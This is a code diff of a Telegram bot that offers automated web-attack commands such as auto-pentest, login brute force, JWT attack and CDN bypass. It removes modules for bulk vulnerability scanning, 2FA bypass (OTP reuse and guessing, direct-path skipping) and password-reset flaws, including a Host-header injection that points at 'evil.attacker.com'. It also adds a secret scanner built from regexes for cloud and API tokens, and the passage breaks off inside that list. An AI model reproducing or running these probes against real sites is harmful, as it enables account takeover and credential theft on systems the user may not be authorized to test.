     app.add_handler(CommandHandler("openredirect", cmd_openredirect))
     app.add_handler(CommandHandler("lfi",          cmd_lfi))
+    app.add_handler(CommandHandler("secretscan",   cmd_secretscan))
+    app.add_handler(CommandHandler("ssltls",       cmd_ssltls))
 
     # ── Callbacks ─────────────────────────────────
     app.add_handler(CallbackQueryHandler(force_join_callback,    pattern="^fj_check$"))
@@ -10432,11 +10503,6 @@ def main():
     app.add_handler(CallbackQueryHandler(dl_mode_callback,       pattern="^dl_"))   # /dl keyboard
     app.add_handler(CallbackQueryHandler(help_category_callback, pattern="^help_"))
     # Custom wordlist upload
-    app.add_handler(MessageHandler(
-        filters.Document.FileExtension("txt") & ~filters.COMMAND,
-        handle_wordlist_upload
-    )) # /help + /start keyboard
-    app.add_handler(CallbackQueryHandler(bulkscan_callback,      pattern="^bscan_"))
 
     # ── Global error handler ──────────────────────
     app.add_error_handler(error_handler)
@@ -10485,20 +10551,18 @@ def main():
             BotCommand("cors",         "🌐 CORS misconfiguration"),
             BotCommand("openredirect", "🔀 Open redirect scan"),
             BotCommand("lfi",          "📂 File inclusion scan"),
+            BotCommand("secretscan",   "🔑 API keys & secrets finder"),
+            BotCommand("ssltls",       "🔒 SSL/TLS config scanner"),
             BotCommand("cloudcheck",   "☁️ Real IP / CDN bypass"),
             BotCommand("paramfuzz",    "🧪 Parameter fuzzer"),
             BotCommand("autopwn",      "⚡ Auto pentest chain"),
             BotCommand("bruteforce",   "🔑 Login brute force"),
-            BotCommand("2fabypass",    "🔓 2FA bypass test"),
-            BotCommand("resetpwd",     "🔒 Password reset test"),
             BotCommand("gitexposed",   "📁 Git exposure finder"),
             BotCommand("sourcemap",    "🗺️ Source map extractor"),
             BotCommand("jwtattack",    "🔐 JWT attack"),
             BotCommand("screenshot",   "📸 Website screenshot"),
             BotCommand("monitor",      "👁️ Website monitor"),
-            BotCommand("bulkscan",     "📋 Bulk URL scan"),
             BotCommand("appassets",    "📦 App asset analyzer"),
-            BotCommand("antibot",      "🤖 Anti-bot bypass"),
             BotCommand("history",      "📜 Download history"),
             BotCommand("mystats",      "📊 My stats"),
             BotCommand("status",       "ℹ️ Bot status"),
@@ -12968,336 +13032,6 @@ async def cmd_autopwn(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 
 # ══════════════════════════════════════════════════
-# ⑦ /bulkscan — Bulk URL Scanner
-# ══════════════════════════════════════════════════
-
-_bulk_scan_sessions: dict = {}  # {uid: list_of_urls}
-
-async def cmd_bulkscan(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """/bulkscan — Bulk URL scan from uploaded .txt file or inline list"""
-    if not await check_force_join(update, context): return
-    uid = update.effective_user.id
-    allowed, wait = check_rate_limit(uid)
-    if not allowed:
-        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
-        return
-
-    if uid in _active_scans:
-        await update.effective_message.reply_text(
-            f"⏳ *`{_active_scans[uid]}` running* — ပြီးဆုံးဖို့ စောင့်ပါ\n"
-            f"သို့မဟုတ် `/stop` နှိပ်ပါ",
-            parse_mode='Markdown')
-        return
-
-    args = context.args or []
-
-    # Inline URL list
-    if args and args[0].startswith("http"):
-        urls = [a.strip() for a in args if a.strip().startswith("http")]
-        if not urls:
-            await update.effective_message.reply_text("❌ Valid URLs မတွေ့ပါ")
-            return
-        await _run_bulkscan(update, context, urls)
-        return
-
-    # Sub-command
-    sub = args[0].lower() if args else ""
-
-    if sub == "tech":
-        urls = _bulk_scan_sessions.get(uid, [])
-        if not urls:
-            await update.effective_message.reply_text(
-                "📋 URLs list မရှိသေးပါ — .txt file upload ပါ\n"
-                "Format: URL per line",
-                parse_mode='Markdown'
-            )
-            return
-        await _run_bulkscan(update, context, urls, mode="tech")
-        return
-
-    # Default: show help + wait for file
-    _bulk_scan_sessions[uid] = []
-    await update.effective_message.reply_text(
-        "📋 *Bulk URL Scanner*\n"
-        "━━━━━━━━━━━━━━━━━━━━\n\n"
-        "*Method 1 — File upload:*\n"
-        "  .txt ဖိုင် upload ပါ (URL per line)\n\n"
-        "*Method 2 — Inline:*\n"
-        "  `/bulkscan https://a.com https://b.com`\n\n"
-        "*Scan modes:*\n"
-        "  `tech` — TechStack scan\n"
-        "  `vuln` — Quick vuln check (default)\n\n"
-        "*Example txt format:*\n"
-        "```\nhttps://example.com\nhttps://target.org\nhttps://site.net\n```\n\n"
-        "📊 Max: `50` URLs | Progress shown\n"
-        "⚠️ _Authorized testing only_",
-        parse_mode='Markdown'
-    )
-
-
-async def handle_bulkscan_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle .txt file upload for bulkscan."""
-    doc = update.message.document
-    if not doc: return
-
-    fname = doc.file_name or ""
-    if not fname.lower().endswith('.txt'): return
-
-    uid = update.effective_user.id
-    if not await check_force_join(update, context): return
-
-    # Download file
-    try:
-        tg_file = await context.bot.get_file(doc.file_id)
-        import io as _io
-        buf = _io.BytesIO()
-        await tg_file.download_to_memory(buf)
-        content = buf.getvalue().decode('utf-8', errors='ignore')
-    except Exception as e:
-        await update.message.reply_text(f"❌ File read error: `{e}`", parse_mode='Markdown')
-        return
-
-    # Parse URLs
-    urls = []
-    for line in content.splitlines():
-        line = line.strip()
-        if line.startswith("http"):
-            safe_ok, _ = is_safe_url(line)
-            if safe_ok:
-                urls.append(line)
-    urls = list(dict.fromkeys(urls))[:50]  # dedupe + limit
-
-    if not urls:
-        await update.message.reply_text(
-            "❌ No valid URLs found in file\n"
-            "Format: one URL per line starting with http/https",
-            parse_mode='Markdown'
-        )
-        return
-
-    # Check if there's a pending bulkscan for this user
-    _bulk_scan_sessions[uid] = urls
-    kb = InlineKeyboardMarkup([
-        [InlineKeyboardButton("⚡ Quick Vuln Scan", callback_data=f"bscan_vuln_{uid}"),
-         InlineKeyboardButton("🔍 TechStack", callback_data=f"bscan_tech_{uid}")],
-        [InlineKeyboardButton("📊 Recon", callback_data=f"bscan_recon_{uid}")],
-    ])
-    await update.message.reply_text(
-        f"📋 *{len(urls)} URLs loaded from `{fname}`*\n\n"
-        "Select scan type:",
-        reply_markup=kb,
-        parse_mode='Markdown'
-    )
-
-
-async def bulkscan_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle bulkscan mode selection."""
-    query = update.callback_query
-    await query.answer()
-    data = query.data
-    uid = query.from_user.id
-
-    if not data.startswith("bscan_"): return
-
-    parts = data.split("_")
-    if len(parts) < 3: return
-    mode = parts[1]
-    target_uid = int(parts[2])
-
-    if uid != target_uid:
-        await query.answer("Not your scan session", show_alert=True)
-        return
-
-    urls = _bulk_scan_sessions.get(uid, [])
-    if not urls:
-        await query.edit_message_text("⚠️ Session expired. Upload file again.")
-        return
-
-    await query.edit_message_text(
-        f"📊 *Bulk Scan Starting*\n`{len(urls)}` URLs | Mode: `{mode}`\n⏳"
-    )
-    await _run_bulkscan(query, context, urls, mode=mode)
-
-
-async def _run_bulkscan(
-    update_or_query, context: ContextTypes.DEFAULT_TYPE,
-    urls: list, mode: str = "vuln"
-):
-    """Run bulk scan on list of URLs."""
-    uid_obj = (update_or_query.from_user if hasattr(update_or_query, 'from_user')
-               else update_or_query.effective_user)
-    uid = uid_obj.id if uid_obj else 0
-
-    chat_id = (update_or_query.message.chat_id
-               if hasattr(update_or_query, 'message') and update_or_query.message
-               else update_or_query.effective_chat.id
-               if hasattr(update_or_query, 'effective_chat')
-               else uid)
-
-    urls = urls[:50]
-    total = len(urls)
-
-    # Send start message
-    status_msg = await context.bot.send_message(
-        chat_id=chat_id,
-        text=f"📊 *Bulk Scan — `{total}` URLs*\nMode: `{mode}`\n\n⏳ Starting...",
-        parse_mode='Markdown'
-    )
-
-    results = []
-    done = 0
-
-    for url in urls:
-        done += 1
-        domain = urlparse(url).hostname or url[:30]
-
-        try:
-            if mode == "tech":
-                pq = []
-                data = await asyncio.to_thread(_techstack_scan_sync, url, pq)
-                detected = data.get("detected", {})
-                tech_list = []
-                for cat in ["CMS","Backend","JS Framework","Web Server"]:
-                    tech_list.extend(detected.get(cat, [])[:1])
-                results.append({
-                    "url": url, "domain": domain, "status": data.get("status_code", "?"),
-                    "tech": ", ".join(tech_list[:4]) or "Unknown",
-                    "waf": data.get("waf_detected",""),
-                })
-
-            elif mode == "recon":
-                pq = []
-                # Quick headers check
-                try:
-                    r = requests.get(url, headers=_get_headers(), timeout=8, verify=False)
-                    sec_headers = ["Strict-Transport-Security","Content-Security-Policy",
-                                   "X-Frame-Options","X-XSS-Protection"]
-                    missing = [h for h in sec_headers if h not in r.headers]
-                    results.append({
-                        "url": url, "domain": domain,
-                        "status": r.status_code,
-                        "server": r.headers.get("Server","?"),
-                        "missing_headers": len(missing),
-                    })
-                except Exception:
-                    results.append({"url": url, "domain": domain, "status": "error"})
-
-            else:  # vuln (quick)
-                pq = []
-                findings = []
-                risk_score = 0
-
-                # Quick SQLi check (error-based only, fast)
-                try:
-                    sqli_data = await asyncio.to_thread(_sqli_scan_sync, url, pq)
-                    if sqli_data.get("error_based") or sqli_data.get("time_based"):
-                        findings.append("SQLi")
-                        risk_score += 30
-                except Exception:
-                    pass
-
-                # Quick XSS check
-                try:
-                    xss_data = await asyncio.to_thread(_xss_scan_sync, url, pq)
-                    if xss_data.get("reflected"):
-                        findings.append("XSS")
-                        risk_score += 20
-                except Exception:
-                    pass
-
-                # Quick headers check
-                try:
-                    r = requests.get(url, headers=_get_headers(), timeout=6, verify=False)
-                    sec_hdrs = ["Strict-Transport-Security","Content-Security-Policy","X-Frame-Options"]
-                    missing_hdrs = [h for h in sec_hdrs if h not in r.headers]
-                    if len(missing_hdrs) >= 3:
-                        findings.append("Missing Headers")
-                    status_code = r.status_code
-                except Exception:
-                    status_code = "err"
-
-                results.append({
-                    "url": url, "domain": domain,
-                    "status": status_code,
-                    "total_vulns": len(findings),
-                    "critical": len([f for f in findings if f in ("SQLi","XSS")]),
-                    "findings": findings,
-                    "risk_score": risk_score,
-                })
-
-        except Exception as e:
-            results.append({"url": url, "domain": domain, "error": str(e)[:40]})
-
-        # Update progress every 5 URLs
-        if done % 5 == 0 or done == total:
-            bar = pbar(done, total, 14)
-            try:
-                await status_msg.edit_text(
-                    f"📊 *Bulk Scan — `{total}` URLs*\nMode: `{mode}`\n\n"
-                    f"`{bar}`\n`{done}/{total}` done",
-                    parse_mode='Markdown'
-                )
-            except Exception:
-                pass
-
-        await asyncio.sleep(0.5)
-
-    # ── Build final report ─────────────────────────
-    lines = [
-        f"📊 *Bulk Scan Complete*",
-        f"━━━━━━━━━━━━━━━━━━━━",
-        f"URLs: `{total}` | Mode: `{mode}`",
-        f"⏰ `{datetime.now().strftime('%Y-%m-%d %H:%M')}`",
-        "",
-    ]
-
-    if mode == "vuln":
-        critical_sites = [r for r in results if r.get("critical",0) > 0]
-        clean_sites    = [r for r in results if r.get("total_vulns",0) == 0]
-        lines.append(f"🔴 Vulnerable: `{len(critical_sites)}`  ✅ Clean: `{len(clean_sites)}`\n")
-        if critical_sites:
-            lines.append("*🔴 Vulnerable Sites:*")
-            for r in critical_sites[:10]:
-                findings_str = ", ".join(r.get("findings",[]))
-                lines.append(f"  `{r['domain']}` — `{findings_str}` (risk: {r.get('risk_score',0)})")
-    elif mode == "tech":
-        lines.append("*🔍 TechStack Results:*")
-        for r in results[:15]:
-            st = r.get("status","?")
-            tech = r.get("tech","?")
-            waf = f" 🛡`{r['waf']}`" if r.get("waf") else ""
-            lines.append(f"  `{r['domain']}` — {tech}{waf} [`{st}`]")
-    elif mode == "recon":
-        lines.append("*📋 Recon Results:*")
-        for r in results[:15]:
-            miss = r.get("missing_headers", 0)
-            srv  = r.get("server","?")
-            lines.append(f"  `{r['domain']}` — `{srv}` | Missing: `{miss}` headers")
-
-    if len(results) > 15:
-        lines.append(f"\n_...{len(results)-15} more in JSON report_")
-
-    await status_msg.edit_text("\n".join(lines), parse_mode='Markdown')
-
-    # Send JSON report
-    import io as _io
-    report_json = json.dumps({
-        "scan_mode": mode, "total_urls": total,
-        "scanned_at": datetime.now().isoformat(),
-        "results": results
-    }, indent=2, ensure_ascii=False)
-    buf = _io.BytesIO(report_json.encode())
-    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
-    await context.bot.send_document(
-        chat_id=chat_id,
-        document=buf,
-        filename=f"bulkscan_{mode}_{ts}.json",
-        caption=f"📊 Bulk Scan Report | {total} URLs | Mode: {mode}"
-    )
-
-
-
-
 # ══════════════════════════════════════════════════════════════════════
 # 🔐 FEATURE #29 — /bruteforce  Login Brute Force (rate-limit aware)
 # ══════════════════════════════════════════════════════════════════════
@@ -13637,463 +13371,6 @@ async def cmd_bruteforce(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 
 # ══════════════════════════════════════════════════════════════════════
-# 🔑 FEATURE #32 — /2fabypass  2FA Bypass Tester
-# ══════════════════════════════════════════════════════════════════════
-
-def _2fa_bypass_sync(url: str, progress_q: list) -> dict:
-    """Test for common 2FA bypass vulnerabilities."""
-    results = {
-        "url": url,
-        "findings": [],
-        "tested_checks": [],
-    }
-    session = requests.Session()
-    session.headers.update(_get_headers())
-    session.verify = False
-
-    # Detect 2FA page patterns
-    try:
-        resp = session.get(url, timeout=10, allow_redirects=True)
-        html = resp.text.lower()
-        body = resp.text
-    except Exception as e:
-        results["error"] = str(e)
-        return results
-
-    otp_hints = ["otp","2fa","two.factor","verification code","authenticator",
-                 "confirm code","security code","one.time","mfa","totp"]
-    has_2fa_page = any(h in html for h in otp_hints)
-    results["has_2fa_page"] = has_2fa_page
-    progress_q.append(f"🔑 2FA page detected: {has_2fa_page}")
-
-    # ── Check 1: OTP code reuse ────────────────────
-    progress_q.append("🔑 Check 1: OTP reuse vulnerability...")
-    results["tested_checks"].append("OTP reuse")
-    # Submit same OTP twice quickly
-    common_otp_params = ["otp","code","token","verification_code","mfa_code","totp"]
-    for param in common_otp_params:
-        try:
-            r1 = session.post(url, data={param: "123456"}, timeout=8)
-            r2 = session.post(url, data={param: "123456"}, timeout=8)
-            if r1.status_code == r2.status_code == 200:
-                len_diff = abs(len(r1.text) - len(r2.text))
-                if len_diff < 50:  # Same response = reuse may work
-                    results["findings"].append({
-                        "type": "OTP Reuse",
-                        "risk": "🟠",
-                        "detail": f"Same OTP `{param}` accepted twice (similar response)",
-                    })
-        except Exception as _e:
-            logging.debug("Scan error: %s", _e)
-
-    # ── Check 2: Skip 2FA (direct URL access) ─────
-    progress_q.append("🔑 Check 2: 2FA skip via direct access...")
-    results["tested_checks"].append("2FA skip")
-    skip_paths = ["/dashboard","/home","/account","/profile","/admin","/panel",
-                  "/user/settings","/api/user","/me"]
-    parsed = urlparse(url)
-    base   = f"{parsed.scheme}://{parsed.netloc}"
-    for path in skip_paths:
-        try:
-            r = session.get(base + path, timeout=8, allow_redirects=False)
-            if r.status_code == 200:
-                skip_indicators = ["dashboard","welcome","account","logout","sign out"]
-                if any(s in r.text.lower() for s in skip_indicators):
-                    results["findings"].append({
-                        "type": "2FA Skip",
-                        "risk": "🔴",
-                        "detail": f"Direct access to `{path}` bypasses 2FA (HTTP 200)",
-                    })
-                    break
-        except Exception as _e:
-            logging.debug("Scan error: %s", _e)
-
-    # ── Check 3: Brute force OTP (no rate limit) ──
-    progress_q.append("🔑 Check 3: OTP brute force rate limit...")
-    results["tested_checks"].append("OTP rate limit")
-    codes_to_try = ["000000","111111","123456","999999","000001","654321"]
-    rate_limited = False
-    for param in ["otp","code","token"]:
-        for code in codes_to_try:
-            try:
-                r = session.post(url, data={param: code}, timeout=5)
-                if r.status_code == 429:
-                    rate_limited = True
-                    break
-            except Exception:
-                pass
-        if rate_limited:
-            break
-    if not rate_limited:
-        results["findings"].append({
-            "type": "OTP No Rate Limit",
-            "risk": "🟡",
-            "detail": "No 429 rate limiting on OTP submission — brute force possible",
-        })
-
-    # ── Check 4: Response manipulation hint ───────
-    progress_q.append("🔑 Check 4: Response manipulation hints...")
-    results["tested_checks"].append("Response manipulation")
-    # Check if 2FA uses client-side validation clues
-    js_clues = ["otp_valid","2fa_verified","mfa_passed","bypass","skip_2fa",
-                "force_login","admin_override"]
-    for clue in js_clues:
-        if clue in html:
-            results["findings"].append({
-                "type": "Client-side 2FA Clue",
-                "risk": "🟠",
-                "detail": f"JS variable `{clue}` found — possible client-side bypass",
-            })
-
-    # ── Check 5: Backup code endpoint ─────────────
-    progress_q.append("🔑 Check 5: Backup/recovery code endpoints...")
-    results["tested_checks"].append("Backup code endpoint")
-    backup_paths = ["/backup-codes","/recovery","/auth/backup","/2fa/recovery",
-                    "/account/recovery","/mfa/backup","/auth/recovery-codes"]
-    for path in backup_paths:
-        try:
-            r = session.get(base + path, timeout=8, allow_redirects=False)
-            if r.status_code in (200, 403):
-                results["findings"].append({
-                    "type": "Backup Code Endpoint",
-                    "risk": "🟡" if r.status_code == 403 else "🟠",
-                    "detail": f"Backup code endpoint `{path}` exists (HTTP {r.status_code})",
-                })
-        except Exception as _e:
-            logging.debug("Scan error: %s", _e)
-
-    return results
-
-
-async def cmd_2fabypass(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """/2fabypass <url> — Test for 2FA bypass vulnerabilities"""
-    if not await check_force_join(update, context): return
-    uid = update.effective_user.id
-    allowed, wait = check_rate_limit(uid)
-    if not allowed:
-        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
-        return
-
-    if not context.args:
-        await update.effective_message.reply_text(
-            "🔑 *2FA Bypass Tester*\n\n"
-            "```\n/2fabypass <2fa_page_url>\n```\n\n"
-            "*Checks:*\n"
-            "  ① OTP code reuse\n"
-            "  ② Direct URL 2FA skip\n"
-            "  ③ OTP brute force (rate limit)\n"
-            "  ④ Client-side bypass hints\n"
-            "  ⑤ Backup/recovery endpoints\n\n"
-            "*Example:* `/2fabypass https://site.com/auth/2fa`\n"
-            "⚠️ _Authorized testing only_",
-            parse_mode='Markdown'
-        )
-        return
-
-    url = context.args[0]
-    if not url.startswith('http'): url = 'https://' + url
-    safe_ok, reason = is_safe_url(url)
-    if not safe_ok:
-        await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode='Markdown')
-        return
-
-    domain = urlparse(url).hostname
-    msg = await update.effective_message.reply_text(
-        f"🔑 *2FA Bypass — `{domain}`*\n\n⏳ Running 5 checks...",
-        parse_mode='Markdown'
-    )
-    progress_q = []
-
-    async def _progress():
-        last = 0
-        while True:
-            await asyncio.sleep(3)
-            if len(progress_q) > last:
-                try:
-                    await msg.edit_text(
-                        f"🔑 *2FA Bypass — `{domain}`*\n\n{progress_q[-1]}",
-                        parse_mode='Markdown'
-                    )
-                except Exception:
-                    pass
-                last = len(progress_q)
-
-    task = asyncio.create_task(_progress())
-    try:
-        result = await asyncio.to_thread(_2fa_bypass_sync, url, progress_q)
-    finally:
-        task.cancel()
-
-    risk_order = {"🔴": 0, "🟠": 1, "🟡": 2}
-    findings = sorted(result.get("findings", []), key=lambda x: risk_order.get(x["risk"], 9))
-
-    lines = [f"🔑 *2FA Bypass Scan — `{domain}`*", "━━━━━━━━━━━━━━━━━━━━",
-             f"2FA page detected: `{'Yes' if result.get('has_2fa_page') else 'No'}`",
-             f"Checks run: `{len(result.get('tested_checks', []))}`\n"]
-
-    if findings:
-        lines.append(f"*🚨 Findings: {len(findings)}*")
-        for f in findings:
-            lines.append(f"  {f['risk']} *{f['type']}*")
-            lines.append(f"     _{f['detail']}_")
-    else:
-        lines.append("✅ No 2FA bypass vectors found")
-
-    lines += [f"\n*Checks:* `{'`, `'.join(result.get('tested_checks', []))}`",
-              "\n⚠️ _Authorized testing only_"]
-    await msg.edit_text("\n".join(lines), parse_mode='Markdown')
-
-    import io as _io
-    _rj = json.dumps(result, indent=2, default=str, ensure_ascii=False)
-    _rb = _io.BytesIO(_rj.encode())
-    _ts = datetime.now().strftime("%Y%m%d_%H%M%S")
-    _sd = re.sub(r'[^\w\-]', '_', domain)
-    await context.bot.send_document(
-        chat_id=update.effective_chat.id, document=_rb,
-        filename=f"2fabypass_{_sd}_{_ts}.json",
-        caption=f"🔑 2FA Bypass — `{domain}`", parse_mode='Markdown'
-    )
-
-
-# ══════════════════════════════════════════════════════════════════════
-# 🔄 FEATURE #33 — /resetpwd  Password Reset Flaw Finder
-# ══════════════════════════════════════════════════════════════════════
-
-def _resetpwd_sync(url: str, progress_q: list) -> dict:
-    """Test for password reset vulnerabilities."""
-    results = {"url": url, "findings": [], "tested": []}
-    session = requests.Session()
-    session.headers.update(_get_headers())
-    session.verify = False
-    parsed = urlparse(url)
-    base   = f"{parsed.scheme}://{parsed.netloc}"
-
-    # Find reset page
-    reset_paths = [
-        "/forgot-password", "/forgot_password", "/reset-password",
-        "/reset_password", "/auth/reset", "/account/forgot",
-        "/user/password/reset", "/password/forgot", "/password/reset",
-        "/login/forgot", "/auth/forgot",
-    ]
-
-    reset_url = url  # default to provided URL
-    progress_q.append("🔄 Finding password reset page...")
-    for path in reset_paths:
-        try:
-            r = session.get(base + path, timeout=8, allow_redirects=True)
-            if r.status_code == 200 and any(
-                h in r.text.lower() for h in ["forgot","reset","email","password"]
-            ):
-                reset_url = base + path
-                progress_q.append(f"🔄 Found reset page: `{path}`")
-                results["reset_page"] = reset_url
-                break
-        except Exception as _e:
-            logging.debug("Scan error: %s", _e)
-
-    # ── Check 1: Token in URL (leaked via Referer) ─
-    progress_q.append("🔄 Check 1: Reset token in URL...")
-    results["tested"].append("Token in URL")
-    try:
-        r = session.post(reset_url, data={"email": "test@test.com"}, timeout=10)
-        if "token=" in r.url or "token=" in r.text:
-            results["findings"].append({
-                "type": "Token in URL",
-                "risk": "🔴",
-                "detail": "Reset token exposed in URL — leaks via Referer header",
-            })
-    except Exception as _e:
-        logging.debug("Scan error: %s", _e)
-
-    # ── Check 2: Host Header Injection ────────────
-    progress_q.append("🔄 Check 2: Host header injection...")
-    results["tested"].append("Host header injection")
-    try:
-        evil_host = "evil.attacker.com"
-        r = session.post(reset_url,
-            data={"email": "victim@test.com"},
-            headers={**_get_headers(), "Host": evil_host, "X-Forwarded-Host": evil_host},
-            timeout=10)
-        if evil_host in r.text or r.status_code == 200:
-            results["findings"].append({
-                "type": "Host Header Injection",
-                "risk": "🔴",
-                "detail": f"Host header `{evil_host}` reflected — reset link sent to attacker domain",
-            })
-    except Exception as _e:
-        logging.debug("Scan error: %s", _e)
-
-    # ── Check 3: Weak/Predictable Token ───────────
-    progress_q.append("🔄 Check 3: Predictable reset token...")
-    results["tested"].append("Predictable token")
-    weak_token_endpoints = ["/reset?token=123456", "/reset?token=000000",
-                             "/reset?token=admin", "/reset?token=test"]
-    for ep in weak_token_endpoints:
-        try:
-            r = session.get(base + ep, timeout=8)
-            if r.status_code == 200 and "invalid" not in r.text.lower():
-                results["findings"].append({
-                    "type": "Weak Token Accepted",
-                    "risk": "🔴",
-                    "detail": f"Predictable token `{ep}` returned HTTP 200",
-                })
-                break
-        except Exception as _e:
-            logging.debug("Scan error: %s", _e)
-
-    # ── Check 4: No Token Expiry ───────────────────
-    progress_q.append("🔄 Check 4: Token expiry check...")
-    results["tested"].append("Token expiry")
-    token_paths = ["/reset?token=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
-                   "/password/reset?token=0" * 1]
-    for path in token_paths:
-        try:
-            r = session.get(base + path, timeout=8)
-            if r.status_code == 200:
-                time.sleep(2)
-                r2 = session.get(base + path, timeout=8)
-                if r2.status_code == 200:
-                    results["findings"].append({
-                        "type": "No Token Expiry Hint",
-                        "risk": "🟡",
-                        "detail": "Reset endpoint returns 200 for repeated token use",
-                    })
-        except Exception as _e:
-            logging.debug("Scan error: %s", _e)
-
-    # ── Check 5: User Enumeration ──────────────────
-    progress_q.append("🔄 Check 5: User enumeration...")
-    results["tested"].append("User enumeration")
-    try:
-        r_valid   = session.post(reset_url, data={"email": "admin@" + parsed.netloc}, timeout=10)
-        r_invalid = session.post(reset_url, data={"email": "zz_notexist_9x@" + parsed.netloc}, timeout=10)
-        if abs(len(r_valid.text) - len(r_invalid.text)) > 100:
-            results["findings"].append({
-                "type": "User Enumeration",
-                "risk": "🟠",
-                "detail": f"Different responses for valid/invalid emails (diff: {abs(len(r_valid.text)-len(r_invalid.text))}B)",
-            })
-    except Exception as _e:
-        logging.debug("Scan error: %s", _e)
-
-    # ── Check 6: Rate limit on reset ──────────────
-    progress_q.append("🔄 Check 6: Reset rate limiting...")
-    results["tested"].append("Rate limit")
-    no_ratelimit = True
-    for _ in range(5):
-        try:
-            r = session.post(reset_url, data={"email": "test@test.com"}, timeout=8)
-            if r.status_code == 429:
-                no_ratelimit = False
-                break
-        except Exception:
-            break
-    if no_ratelimit:
-        results["findings"].append({
-            "type": "No Rate Limit on Reset",
-            "risk": "🟡",
-            "detail": "Password reset accepts 5+ rapid requests without rate limiting",
-        })
-
-    return results
-
-
-async def cmd_resetpwd(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """/resetpwd <url> — Password reset vulnerability finder"""
-    if not await check_force_join(update, context): return
-    uid = update.effective_user.id
-    allowed, wait = check_rate_limit(uid)
-    if not allowed:
-        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
-        return
-
-    if not context.args:
-        await update.effective_message.reply_text(
-            "🔄 *Password Reset Flaw Finder*\n\n"
-            "```\n/resetpwd <site_url>\n```\n\n"
-            "*Checks:*\n"
-            "  ① Reset token leaked in URL\n"
-            "  ② Host header injection\n"
-            "  ③ Weak/predictable tokens\n"
-            "  ④ No token expiry\n"
-            "  ⑤ User enumeration via response\n"
-            "  ⑥ No rate limiting on reset\n\n"
-            "*Example:* `/resetpwd https://site.com`\n"
-            "⚠️ _Authorized testing only_",
-            parse_mode='Markdown'
-        )
-        return
-
-    url = context.args[0]
-    if not url.startswith('http'): url = 'https://' + url
-    safe_ok, reason = is_safe_url(url)
-    if not safe_ok:
-        await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode='Markdown')
-        return
-
-    domain = urlparse(url).hostname
-    msg = await update.effective_message.reply_text(
-        f"🔄 *Reset Pwd Scan — `{domain}`*\n\n⏳ Running 6 checks...",
-        parse_mode='Markdown'
-    )
-    progress_q = []
-
-    async def _progress():
-        last = 0
-        while True:
-            await asyncio.sleep(3)
-            if len(progress_q) > last:
-                try:
-                    await msg.edit_text(
-                        f"🔄 *Reset Pwd Scan — `{domain}`*\n\n{progress_q[-1]}",
-                        parse_mode='Markdown'
-                    )
-                except Exception:
-                    pass
-                last = len(progress_q)
-
-    task = asyncio.create_task(_progress())
-    try:
-        result = await asyncio.to_thread(_resetpwd_sync, url, progress_q)
-    finally:
-        task.cancel()
-
-    risk_order = {"🔴": 0, "🟠": 1, "🟡": 2}
-    findings = sorted(result.get("findings", []), key=lambda x: risk_order.get(x["risk"], 9))
-
-    lines = [f"🔄 *Reset Password Scan — `{domain}`*", "━━━━━━━━━━━━━━━━━━━━"]
-    if result.get("reset_page"):
-        lines.append(f"📍 Reset page: `{result['reset_page']}`")
-    lines.append("")
-
-    if findings:
-        lines.append(f"*🚨 Vulnerabilities: {len(findings)}*")
-        for f in findings:
-            lines.append(f"\n  {f['risk']} *{f['type']}*")
-            lines.append(f"     _{f['detail']}_")
-    else:
-        lines.append("✅ No password reset flaws found")
-
-    checks = result.get("tested", [])
-    lines += [f"\n*Checks run:* `{len(checks)}`",
-              f"`{'`, `'.join(checks)}`",
-              "\n⚠️ _Authorized testing only_"]
-    await msg.edit_text("\n".join(lines), parse_mode='Markdown')
-
-    import io as _io
-    _rj = json.dumps(result, indent=2, default=str, ensure_ascii=False)
-    _rb = _io.BytesIO(_rj.encode())
-    _ts = datetime.now().strftime("%Y%m%d_%H%M%S")
-    _sd = re.sub(r'[^\w\-]', '_', domain)
-    await context.bot.send_document(
-        chat_id=update.effective_chat.id, document=_rb,
-        filename=f"resetpwd_{_sd}_{_ts}.json",
-        caption=f"🔄 ResetPwd — `{domain}`", parse_mode='Markdown'
-    )
-
-
-# ══════════════════════════════════════════════════════════════════════
-# 🗺️ FEATURE #35 — /sourcemap  JS Source Map Extractor
 # ══════════════════════════════════════════════════════════════════════
 
 def _sourcemap_sync(url: str, progress_q: list) -> dict:
@@ -15239,6 +14516,559 @@ async def cmd_lfi(update: Update, context: ContextTypes.DEFAULT_TYPE):
     else:
         lines.append("✅ No LFI vulnerabilities detected")
     lines.append("\n⚠️ _Authorized testing only_")
+    await msg.edit_text("\n".join(lines), parse_mode='Markdown')
+
+
+
+# ╔══════════════════════════════════════════════════════════════╗
+# ║   NEW FEATURES — /secretscan  /ssltls                       ║
+# ╚══════════════════════════════════════════════════════════════╝
+
+# ══════════════════════════════════════════════════
+# 🔑 /secretscan — API Keys & Secrets in JS/Source
+# ══════════════════════════════════════════════════
+
+_SECRET_REGEX_MAP = {
+    # Cloud Providers
+    "AWS Access Key":        (r'AKIA[0-9A-Z]{16}', "🔴 CRITICAL"),
+    "AWS Secret Key":        (r'(?i)aws.{0,20}secret.{0,20}["\']([A-Za-z0-9/+=]{40})', "🔴 CRITICAL"),
+    "GCP API Key":           (r'AIza[0-9A-Za-z\-_]{35}', "🔴 CRITICAL"),
+    "Azure Connection":      (r'DefaultEndpointsProtocol=https;AccountName=', "🔴 CRITICAL"),
+    # Auth Tokens
+    "GitHub Token":          (r'ghp_[A-Za-z0-9]{36}|github_pat_[A-Za-z0-9_]{82}', "🔴 CRITICAL"),
+    "GitLab Token":          (r'glpat-[A-Za-z0-9\-]{20}', "🔴 CRITICAL"),
+    "Slack Token":           (r'xox[baprs]-[0-9A-Za-z\-]{10,48}', "🔴 CRITICAL"),
